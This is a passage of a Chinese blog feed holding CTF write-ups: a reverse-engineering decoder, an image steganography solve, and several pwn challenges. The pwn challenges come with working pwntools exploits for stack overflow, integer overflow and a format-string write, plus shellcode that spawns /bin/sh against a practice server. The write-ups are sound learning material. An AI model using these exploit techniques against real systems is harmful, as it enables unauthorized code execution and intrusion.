class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">246</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">    <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">198</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">146</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">94</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">220</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">131</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">31</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">118</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">146</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>,  <span class="number">37</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">101</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">251</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">46</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">107</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">135</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">233</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">159</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">34</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">256</span>] = &#123;</span><br><span class="line">  <span class="number">0x1A</span>, <span class="number">0x32</span>, <span class="number">0x4A</span>, <span class="number">0x3B</span>, <span class="number">0x30</span>, <span class="number">0xA5</span>, <span class="number">0x7F</span>, <span class="number">0xF0</span>, <span class="number">0xC4</span>, <span class="number">0x48</span>, </span><br><span class="line">  <span class="number">0xE5</span>, <span class="number">0x52</span>, <span class="number">0xC7</span>, <span class="number">0x53</span>, <span class="number">0xC0</span>, <span class="number">0x2D</span>, <span class="number">0xBE</span>, <span class="number">0xEC</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, </span><br><span class="line">  <span class="number">0xB1</span>, <span class="number">0x04</span>, <span class="number">0x18</span>, <span class="number">0x2E</span>, <span class="number">0xB5</span>, <span class="number">0x44</span>, <span class="number">0x15</span>, <span class="number">0x57</span>, <span class="number">0xDC</span>, <span class="number">0x9F</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0x42</span>, <span class="number">0xFF</span>, <span class="number">0x22</span>, <span class="number">0x4D</span>, <span class="number">0xA6</span>, <span class="number">0x33</span>, <span class="number">0x5F</span>, <span class="number">0x5C</span>, <span class="number">0x8E</span>, </span><br><span class="line">  <span class="number">0x3F</span>, <span class="number">0x4C</span>, <span class="number">0xA8</span>, <span class="number">0xFE</span>, <span class="number">0x1C</span>, <span class="number">0x7E</span>, <span class="number">0x24</span>, <span class="number">0x6C</span>, <span class="number">0x6A</span>, <span class="number">0x9C</span>, </span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0xA1</span>, <span class="number">0x50</span>, <span class="number">0xC5</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0xC1</span>, <span class="number">0x26</span>, <span class="number">0x16</span>, <span class="number">0x55</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0xCD</span>, <span class="number">0xAA</span>, <span class="number">0x8A</span>, <span class="number">0xD1</span>, <span class="number">0x74</span>, <span class="number">0x77</span>, <span class="number">0xD8</span>, <span class="number">0x68</span>, <span class="number">0xFC</span>, </span><br><span class="line">  <span class="number">0x19</span>, <span class="number">0xCC</span>, <span class="number">0xE7</span>, <span class="number">0x88</span>, <span class="number">0xB7</span>, <span class="number">0xE6</span>, <span class="number">0x3E</span>, <span class="number">0x70</span>, <span class="number">0x86</span>, <span class="number">0x9E</span>, </span><br><span class="line">  <span class="number">0x98</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x56</span>, <span class="number">0xCA</span>, <span class="number">0x95</span>, <span class="number">0xB2</span>, <span class="number">0x51</span>, <span class="number">0xAF</span>, <span class="number">0xD3</span>, </span><br><span class="line">  <span class="number">0x6B</span>, <span class="number">0x28</span>, <span class="number">0x8B</span>, <span class="number">0xEE</span>, <span class="number">0xBC</span>, <span class="number">0x9B</span>, <span class="number">0x85</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x84</span>, <span class="number">0xBF</span>, <span class="number">0x25</span>, <span class="number">0x59</span>, <span class="number">0xBA</span>, <span class="number">0x46</span>, <span class="number">0xB8</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x3D</span>, <span class="number">0xB0</span>, <span class="number">0x7A</span>, <span class="number">0xEB</span>, <span class="number">0x38</span>, <span class="number">0x5A</span>, <span class="number">0x41</span>, <span class="number">0x8D</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x81</span>, <span class="number">0x79</span>, <span class="number">0x12</span>, <span class="number">0x40</span>, <span class="number">0x1B</span>, <span class="number">0xF8</span>, <span class="number">0xED</span>, <span class="number">0x82</span>, <span class="number">0x8F</span>, </span><br><span class="line">  <span class="number">0xD4</span>, <span class="number">0x94</span>, <span class="number">0xC8</span>, <span class="number">0x0E</span>, <span class="number">0xE3</span>, <span class="number">0x10</span>, <span class="number">0xB4</span>, <span class="number">0x39</span>, <span class="number">0x3C</span>, <span class="number">0x54</span>, </span><br><span class="line">  <span class="number">0x5B</span>, <span class="number">0x4F</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0x08</span>, <span class="number">0xBD</span>, <span class="number">0xF4</span>, <span class="number">0x5D</span>, <span class="number">0x91</span>, <span class="number">0x1F</span>, </span><br><span class="line">  <span class="number">0x7C</span>, <span class="number">0x8C</span>, <span class="number">0x66</span>, <span class="number">0xCE</span>, <span class="number">0x7B</span>, <span class="number">0x99</span>, <span class="number">0xC3</span>, <span class="number">0xD6</span>, <span class="number">0x29</span>, <span class="number">0xA2</span>, </span><br><span class="line">  <span class="number">0xAB</span>, <span class="number">0xC9</span>, <span class="number">0x4E</span>, <span class="number">0xCF</span>, <span class="number">0xDB</span>, <span class="number">0xF6</span>, <span class="number">0xA3</span>, <span class="number">0x03</span>, <span class="number">0xB9</span>, <span class="number">0xA7</span>, </span><br><span class="line">  <span class="number">0xEA</span>, <span class="number">0x69</span>, <span class="number">0x05</span>, <span class="number">0x1D</span>, <span class="number">0xEF</span>, <span class="number">0x0B</span>, <span class="number">0x23</span>, <span class="number">0x11</span>, <span class="number">0x37</span>, <span class="number">0x21</span>, </span><br><span class="line">  <span class="number">0x1E</span>, <span class="number">0xBB</span>, <span class="number">0x17</span>, <span class="number">0xD2</span>, <span class="number">0xB3</span>, <span class="number">0xDE</span>, <span class="number">0x2C</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x78</span>, <span class="number">0x61</span>, <span class="number">0xCB</span>, <span class="number">0xAD</span>, <span class="number">0x9A</span>, <span class="number">0xA4</span>, <span class="number">0xF3</span>, <span class="number">0x0A</span>, <span class="number">0xA0</span>, <span class="number">0x14</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0x92</span>, <span class="number">0x0D</span>, <span class="number">0x5E</span>, <span class="number">0xA9</span>, <span class="number">0xD5</span>, <span class="number">0x90</span>, <span class="number">0x96</span>, <span class="number">0x6F</span>, <span class="number">0x36</span>, </span><br><span class="line">  <span class="number">0xFD</span>, <span class="number">0x76</span>, <span class="number">0x45</span>, <span class="number">0xDA</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0x0F</span>, <span class="number">0xB6</span>, <span class="number">0x34</span>, <span class="number">0x3A</span>, </span><br><span class="line">  <span class="number">0xDD</span>, <span class="number">0xD0</span>, <span class="number">0xD7</span>, <span class="number">0xAC</span>, <span class="number">0xFB</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x27</span>, <span class="number">0x13</span>, <span class="number">0x93</span>, </span><br><span class="line">  <span class="number">0x87</span>, <span class="number">0x72</span>, <span class="number">0x89</span>, <span class="number">0x49</span>, <span class="number">0x73</span>, <span class="number">0x71</span>, <span class="number">0x7D</span>, <span class="number">0x06</span>, <span class="number">0x9D</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x83</span>, <span class="number">0xE8</span>, <span class="number">0xC2</span>, <span class="number">0x75</span>, <span class="number">0xAE</span>, <span class="number">0xF7</span>, <span class="number">0x97</span>, <span class="number">0x60</span>, <span class="number">0xE1</span>, <span class="number">0xD9</span>, </span><br><span class="line">  <span class="number">0x2F</span>, <span class="number">0x6E</span>, <span class="number">0x4B</span>, <span class="number">0x31</span>, <span class="number">0xE9</span>, <span class="number">0x43</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v6 = <span class="number">0</span>, v7 = <span class="number">0</span>, v5 = <span class="number">0</span>, ans[<span class="number">37</span>] = &#123;<span class="number">0</span>&#125;, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">37</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">296</span>; i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">ans[j++] = *(<span class="keyword">long</span> <span class="keyword">int</span> *)(&amp;ida_chars[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v6 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)(v6 + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) + v6 + <span class="number">1</span>) - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)(v6 + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">v5 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v7 + a[v6]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">v7 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(v5 + v7 + a[v6]) - v5;</span><br><span class="line"><span class="keyword">int</span> temp = a[v6];</span><br><span class="line">a[v6] = a[v7];</span><br><span class="line">a[v7] = temp;</span><br><span class="line"></span><br><span class="line">flag[i] = ans[i]^a[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)(a[v6] + a[v7])];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626214751017.png" alt="image-20200626214751017"></p></li></ul><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="透明度"><a href="#透明度" class="headerlink" title="透明度"></a>透明度</h3><p>题目描述：你知道RGBA吗？</p><p>下载后是一张表情包。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/Rgba.png" alt="Rgba"></p><p>从题目的描述与RGB有关，放入Stegsolve中看一下，可以看到在透明的管道隐藏有数据。且题目名称都是透明度。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627094515063.png" alt="image-20200627094515063"></p><p>然后直接提取出透明管道的所有数据，但开始自己复制的数据然后粘贴到一个文件，最后得到的压缩包一直损坏。后面对比发现是每次换行的地方会出问题。</p><p>其实直接save bin 啊</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627094815397.png" alt="image-20200627094815397"></p><p>最后得到的要压缩包根据提示爆破出密码即可：nepnb</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627095017830.png" alt="image-20200627095017830"></p><p>最后其实这个的题使用zesteg可以直接得到压缩包。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627095200352.png" alt="image-20200627095200352"></p><p>再使用<strong>zsteg Rgba.png -e ‘b8,a,lsb,xy’ &gt; 1.zip</strong>提取出压缩包。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Reverse&quot;&gt;&lt;a href=&quot;#Reverse&quot; class=&quot;headerlink&quot; title=&quot;Reverse:&quot;&gt;&lt;/a&gt;Reverse:&lt;/h2&gt;&lt;h3 id=&quot;T0p-Gear&quot;&gt;&lt;a href=&quot;#T0p-Gear&quot; class=&quot;headerlink&quot; title=&quot;T0p Gear&quot;&gt;&lt;/a&gt;T0p Gear&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;64位elf文件加了upx壳，脱壳后载入ida中发现伪代码不好看，就直接看汇编。就三个检查函数。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626120857536.png&quot; alt=&quot;image-20200626120857536&quot;&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn 攻防世界（1）</title>
    <link href="https://www.bxnop.cn/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/"/>
    <id>https://www.bxnop.cn/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/</id>
    <published>2020-06-04T05:05:44.000Z</published>
    <updated>2020-06-12T09:18:29.208Z</updated>
    
    <content type="html"><![CDATA[<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><blockquote><p>栈溢出</p></blockquote><ul><li><p>ida打开看一下。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200604180206603.png" alt="image-20200604180206603"></p><a id="more"></a></li><li><p>可以知道这个随机数种子我们是不知道的，但是可以直接通过gets(v7)，通过栈溢出把这个种子换成1，再用1计算出随机数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">46809</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span>*<span class="string">'a'</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">l = <span class="string">'2542625142'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">p.recvuntil(<span class="string">'input'</span>)</span><br><span class="line">p.sendline(i)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200604180443703.png" alt="image-20200604180443703"></p></li><li><p><strong>总结：对栈更加熟悉。</strong></p></li></ul><hr><h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><blockquote><p>栈溢出，控制程序走向</p></blockquote><ul><li><p>使用checksec看一保护，没有canary。</p></li><li><p>ida中看一下，gets()存在溢出，有system()函数，但是字符串不是我们想要的shell。和之前在论剑场做过的很像，只不过那个是64位，这个是32位，参数传递不同而已。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605123722286.png" alt="image-20200605123722286"></p></li><li><p>尝试使用 ROPgadget搜索<strong>$0</strong>,无果。但回到程序看到有一个全局变量让我们输入name，那就自己构造。</p></li><li><p>找到system的地址，写py脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">53127</span>)</span><br><span class="line">s = <span class="string">'$0'</span> <span class="comment">#这里也可以'/bin/sh'</span></span><br><span class="line">p.recvuntil(<span class="string">'name'</span>)</span><br><span class="line">p.sendline(s)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x26</span>+<span class="number">4</span>)*<span class="string">'a'</span> + p32(<span class="number">0x0804855A</span>) + p32(<span class="number">0x0804A080</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'here:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li><li><p>得到shell。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605124200541.png" alt="image-20200605124200541"></p></li><li><p><strong>总结：上次是64位，这次体验了32位程序，传参不同。</strong></p></li></ul><hr><h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><blockquote><p>栈溢出，整数溢出</p></blockquote><ul><li><p>没有开启canary，在ida中可以看到第一个login函数都不存在溢出。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605161502591.png" alt="image-20200605161502591"></p></li><li><p>但从搜索的字符串找到引用，有一个system(“cat flag”)，所以还是考虑通过栈溢出控制程序走向。</p></li></ul><ul><li><p>果然在<strong>check_passwd（&amp;buf）</strong>存在栈溢出，这里就是多了个整数溢出。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605161944323.png" alt="image-20200605161944323"></p></li><li><p>由于一个字节无符号的范围（0-255），那我们最小只要260就可以让v3==4即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54696</span>)</span><br><span class="line">payload = (<span class="number">0x14</span>+<span class="number">4</span>)*<span class="string">'a'</span> + p32(<span class="number">0x08048694</span>) + (<span class="number">260</span><span class="number">-28</span>)*<span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'username:'</span>)</span><br><span class="line">p.sendline(<span class="string">'Bnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'passwd:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605163357042.png" alt="image-20200605163357042"></p></li><li><p><strong>总结：对整数溢出有了了解。</strong></p></li></ul><hr><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><blockquote><p>格式化字符换漏洞，写入shellcode。但是有很多逻辑干扰，关键还是分析到强制转化为函数到执行，联系到执行自己的shellcode。</p></blockquote><ul><li><p>程序除了基址随机化保护关了，其他全开。</p></li><li><p>载入ida找漏洞，感觉有点复杂，一个小游戏，函数有点多。但是由于没有关键字符串与system（）函数，这时候就可以往写shellcode方面想。果然在<strong>sub_400CA6((_DWORD *)a1);</strong>中找到了。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605203928195.png" alt="image-20200605203928195"></p></li><li><p>但要使整个函数执行，上面有个判断，<strong>*a1 == a1[1]</strong>，寻找*a1的参数来源，可以知道使main()函数里的v4。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605221940761.png" alt="image-20200605221940761"></p></li><li><p>这时候看有没有地方可以让着2个数相等。还有2个关键函数仔细看的。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605222351181.png" alt="image-20200605222351181"></p></li><li><p>进入<strong>sub_400A7D()</strong>，直接输入east跳过就好了。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605222611543.png" alt="image-20200605222611543"></p></li><li><p>再看<strong>sub_400BB9()</strong>,正好这里有这个漏洞，且有提示信息。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605224545388.png" alt="image-20200605224545388"></p></li><li><p>下面用gdb调试看看v2的值在第几个参数位置。在printf()处下断点。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605225102222.png" alt="image-20200605225102222"></p></li><li><p>但是注意这是64位程序，先是使用6个寄存器传递参数（rdi, rsi, rdx, rcx, r8, r9）,而这里<strong>rdi</strong>作为了格式化字符串的参数，那寄存器还有5个用来传递参数，那我们的改变地址的值就是第(5+2) = 7个参数了。</p></li><li><p>开始写脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug' 这个可以将每一步的调试信息反馈给用户。</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">46461</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">addr = int(p.recv(<span class="number">7</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name be:'</span>)</span><br><span class="line">p.sendline(<span class="string">'Bnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'east or up?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'east'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'leave(0)?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"address'"</span>)</span><br><span class="line">p.sendline(str(addr))</span><br><span class="line">p.recvuntil(<span class="string">'wish is:'</span>)</span><br><span class="line">p.sendline(<span class="string">'%085d%7$n'</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>) <span class="comment">#这里shellcode的2中写法。</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#shellcode="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line">p.recvuntil(<span class="string">'YOU SPELL'</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200606091645885.png" alt="image-20200606091645885"></p></li><li><p><strong>总结：1.shellcode的写法：一：通过shellcraft 一个生成shellcode的类。shellcraft.sh()获得执行system(“/bin/sh”)汇编代码所对应的机器码。二：通过反汇编的shellcode代码。2.对格式化字符串漏洞及64位传参加深了理解。3.分析长的题目。</strong></p></li></ul><hr><h2 id="level3"><a href="#level3" class="headerlink" 